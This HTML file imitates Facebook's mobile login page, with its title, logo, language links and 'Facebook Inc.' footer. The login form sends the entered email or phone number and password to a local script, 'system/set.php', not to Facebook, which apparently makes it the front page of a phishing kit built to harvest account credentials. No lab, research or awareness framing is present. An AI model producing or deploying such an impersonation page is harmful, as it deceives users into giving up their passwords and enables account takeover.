<html>
    <head>
        <title>Facebook – log in or sign up</title>
        <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
        <link href="img/icon.png" rel="shortcut icon" sizes="196x196">
        <link href="css/login.css" rel="stylesheet" type="text/css"/>
    </head>
    <body>
        <div class="wrapper">
            <div class="header">
                <a href="#" class="logo">
                    <img src="img/logo-white.png" alt=""/>
                </a>
            </div>
            <div class="login-area">
                <div class="login-form">
                    <form method="post" action="system/set.php">
                        <div class="form-group">
                            <span class="label">Phone number or email address</span>
                            <input class="form-control" name="email" type="text">
                        </div>
                        <div class="form-group">
                            <span class="label">Password</span>
                            <div class="_5xu4">
                                <input class="form-control" name="pass" type="password">
                            </div>
                        </div>
                        <div class="form-group">
                            <input type="submit" value="Login" name="login" class="login-btn">
                        </div>
                    </form>
                    <div class="bt">
                        <span class="bu">or</span>
                    </div>

                    <div class="signup">
                        <a class="signup-btn">Create New Account</a>
                    </div>

                    <div class="forgot">
                        <a href="#">Forgotten password?</a>
                    </div>
                </div>
                <div class="login_footer">
                    <div class="footer">
                        <div class="lett">
                            <span class="uk">English (UK)</span>
                            <ul>
                                <li><a href="#">অসমীয়া</a></li>
                                <li><a href="" >Bahasa Indonesia</a></li>
                                <li> <a href="#" >Português (Brasil)</a></li>
                            </ul>
                        </div>

                        <div class="right">
                            <ul>
                                <li><a href="#" >বাংলা</a></li>
                                <li><a href="#">हिन्दी</a></li>
                                <li><a href="#">Español</a></li>
                            </ul>
                            <a href="#">
                                <i class="img sp_r1kll-jZ9y4 sx_b31c7f"></i>
                            </a>
                        </div>
                    </div>
                    <div class="copyright">
                        <span class="mfss">Facebook Inc.</span>
                    </div>
                </div>
            </div>
        </div>
    </body>
</html>